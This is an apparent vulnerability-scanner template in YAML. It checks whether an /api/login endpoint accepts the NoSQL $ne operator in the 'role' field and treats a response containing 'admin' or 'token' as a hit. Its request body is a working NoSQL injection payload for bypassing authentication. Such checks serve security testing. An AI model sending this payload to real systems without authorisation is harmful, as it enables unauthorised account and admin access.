id: nosql2-052
name: 'NoSQL $ne in role'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $ne accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"role":{"$ne":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
